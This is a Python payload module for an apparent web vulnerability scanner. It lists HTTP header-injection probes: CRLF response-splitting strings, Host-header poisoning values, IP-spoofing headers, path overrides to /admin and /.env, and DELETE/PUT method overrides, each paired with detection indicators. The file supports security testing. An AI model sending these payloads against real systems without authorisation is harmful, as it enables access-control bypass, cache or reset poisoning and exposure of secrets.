"""
web/payloads/header_injection.py
---------------------------------
HTTP Header Injection payload library for Raven Phase 8.

Covers:
  - Host header injection (password reset poisoning, cache poisoning)
  - X-Forwarded-For / X-Real-IP spoofing
  - CRLF injection (%0d%0a) → HTTP response splitting
  - Cookie injection via CRLF
  - X-Original-URL / X-Rewrite-URL path override
  - Forwarded header manipulation
  - X-HTTP-Method-Override (method tunnelling)

Confirmation: response contains the injected header value in body/headers,
or an injected Set-Cookie header appears in the response.
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── CRLF injection → response splitting ──────────────────────────────────
    "%0d%0aSet-Cookie:injected=raven_crlf_test",
    "%0d%0aX-Injected:raven_header_test",
    "\r\nSet-Cookie:injected=raven_crlf_test",
    "\r\nX-Injected:raven_header_test",
    "%0aSet-Cookie:injected=raven_crlf_test",
    # ── Host header injection ─────────────────────────────────────────────────
    "evil.raven-scan-test.invalid",
    "evil.raven-scan-test.invalid:80",
    "evil.raven-scan-test.invalid\r\nX-Injected: raven",
    # ── X-Forwarded-For / IP spoofing ─────────────────────────────────────────
    "127.0.0.1",
    "localhost",
    "10.0.0.1",
    "192.168.1.1",
    # ── X-Original-URL path override ──────────────────────────────────────────
    "/admin",
    "/internal/api",
    "/.env",
    # ── Newline variants in User-Agent (header splitting) ─────────────────────
    "Mozilla/5.0\r\nX-Injected: raven_ua_test",
    "Mozilla/5.0%0d%0aX-Injected:%20raven_ua_test",
]

# ── Header names these payloads target ────────────────────────────────────────

#: (header_name, payload) pairs for structured testing in probe_engine.
HEADER_TARGETS: list[tuple[str, str]] = [
    # CRLF — inject into Referer, which is often logged/reflected
    ("Referer", "%0d%0aSet-Cookie:injected=raven_crlf_test"),
    ("Referer", "%0aX-Injected:raven"),
    # Host header injection
    ("Host", "evil.raven-scan-test.invalid"),
    # IP spoofing headers
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Forwarded-Host", "evil.raven-scan-test.invalid"),
    # Path override
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    # Method override
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-Method-Override", "PUT"),
]

# ── Expected indicators ────────────────────────────────────────────────────────

HEADER_INDICATORS: list[str] = [
    "injected=raven_crlf_test",
    "X-Injected",
    "raven_crlf_test",
    "evil.raven-scan-test.invalid",
    "Set-Cookie: injected",
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload="%0d%0aSet-Cookie:injected=raven_crlf_test",
        injection_type="header",
        expected_indicator="injected=raven_crlf_test",
        severity="High",
        vuln_type="HeaderInjection",
    ),
    PayloadContext(
        payload="\r\nSet-Cookie:injected=raven_crlf_test",
        injection_type="header",
        expected_indicator="injected=raven_crlf_test",
        severity="High",
        vuln_type="HeaderInjection",
    ),
    PayloadContext(
        payload="evil.raven-scan-test.invalid",
        injection_type="header",
        expected_indicator="evil.raven-scan-test.invalid",
        severity="High",
        vuln_type="HeaderInjection",
    ),
    PayloadContext(
        payload="127.0.0.1",
        injection_type="header",
        expected_indicator="127.0.0.1",
        severity="Medium",
        vuln_type="HeaderInjection",
    ),
    PayloadContext(
        payload="/admin",
        injection_type="header",
        expected_indicator="admin",
        severity="High",
        vuln_type="HeaderInjection",
    ),
]
